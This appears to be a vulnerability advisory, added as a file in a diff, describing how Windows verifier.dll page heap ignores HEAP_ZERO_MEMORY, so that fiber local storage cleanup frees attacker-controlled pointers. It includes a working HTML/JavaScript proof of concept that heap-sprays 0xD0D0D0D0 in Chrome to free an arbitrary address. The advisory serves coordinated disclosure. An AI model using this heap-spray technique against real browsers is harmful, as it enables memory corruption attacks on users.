@@ -1,0 +1,97 @@
+1177r - verifier!AVrfDebugPageHeapAllocate incorrect memory initialization
+=====================================
+
+Synopsis
+--------
+verifier!AVrfDebugPageHeapAllocate ignores the HEAP_ZERO_MEMORY flag, which can
+introduce bugs and vulnerabilities in code that depend on it.
+
+Description
+-----------
+When running an application with page heap enabled, verifier.dll is injected
+into the process and hooks heap memory management functions in order to
+implement page heap. It turns out that under certain circumstances,
+verifier!AVrfDebugPageHeapAllocate can ignore the HEAP_ZERO_MEMORY flag, and
+fills the memory with bytes with value 0xD0. This will break code that depends
+on the allocated heap memory to be zeroed out for proper functioning.
+
+One example of such code is Fiber Local Storage (FLS). In
+ntdll!RtlProcessFlsData, it calls ntdll!RtlAllocateHeap with this flag. The
+allocated memory is used by FLS code to store a structure that contains at
+least one pointer. This pointer is expected to be NULL initially and contain a
+valid pointer to another structure if it is not NULL. Because of this error,
+the pointer will be 0xD0D0D0D0 initially and the FLS code will assume it is a
+valid pointer to a structure even though it is not.
+
+If the FLS is destroyed before the pointer is set by FLS code, the FLS cleanup
+code will assume 0xD0D0D0D0 is a pointer to a valid structure that needs to be
+cleaned up as well. It will pass the pointer to msvcrt!_freefls, which assumes
+the pointer points to a structure with some more pointers. For a number of
+these secondary pointers, it calls msvcrt!free if they are not NULL.
+
+On 32-bit applications running on 64-bit versions of windows, it is possible to
+allocate memory at address 0xD0D0D0D0. E.g. in a browser this is quite easy to
+do with a JavaScript heap spray. If an attacker were to allocate memory at this
+address and fill it with a fake structure, s/he could cause the FLS cleanup
+code to free arbitrary pointers of his/her choice. Together with an information
+leak that reveals the location of memory allocations, this could be used to
+introduce use-after-free vulnerabilities in code that itself is not vulnerable.
+
+Exploit
+-------
+I found a case where this problem can be used to free an arbitrary pointer in
+Google Chrome and created a PoC that will cause the FLS cleanup code to attempt
+to free memory at address 0xDEADBEEF. Here is the code:
+
+    <!doctype html>
+    <html><head><script>
+      function cStructureHeapSpray(uBaseAddress, uSize) {
+        var uHeapSprayBase = 0x80004000;
+        function fuAddressToIndex(uAddress) {
+          return (uAddress - uHeapSprayBase) / 4;
+        };
+        var oThis = this,
+            uArraySize = fuAddressToIndex(uBaseAddress + uSize),
+            adwHeapSpray = new Uint32Array(uArraySize);
+        oThis.fSetDWord = function (uOffset, uValue) {
+          adwHeapSpray[fuAddressToIndex(uBaseAddress + uOffset)] = uValue;
+        };
+      };
+      try {
+        var uStructureAddress = 0xD0D0D0D0;
+            uStructureSize = 0x1000,
+            oStructureHeapSpray = 
+                new cStructureHeapSpray(uStructureAddress, uStructureSize);
+        // Cause D0D0D0F4 to point to 0xDEADBEEF
+        oStructureHeapSpray.fSetDWord(0x24, 0xDEADBEEF);
+      } catch (e) {
+        // still allocated from previous run.
+      }
+      location.reload();
+      new AudioContext("notification").decodeAudioData(
+        new ArrayBuffer(1),
+        function(){},
+        function(){}
+      );
+    </script></head></html>
+
+I initially assumed this was a bug in Google Chrome, but the Google Chrome
+Security team investigated in more detail and explained that this was a bug in
+verifier.dll instead. You can see the entire conversation here:
+[https://code.google.com/p/chromium/issues/detail?id=525288]
+You will need to ask the Google Chrome Security team for permission to access
+this issue, as access is restricted. You can contact them at
+security@chromium.org.
+
+Notes
+-----
+I allow vendors 60 days to fix an issue, unless they can provide an adequate
+reason for extending this deadline. Failure to meet a deadline without an
+adequate explanation will normally result in public disclosure of information
+regarding the vulnerability to the general public.
+
+Credit
+------
+If you can confirm this as a security issue and would like to provide credits
+for reporting the issue in your advisory, please credit "SkyLined" and "Ricky
+Zhou".
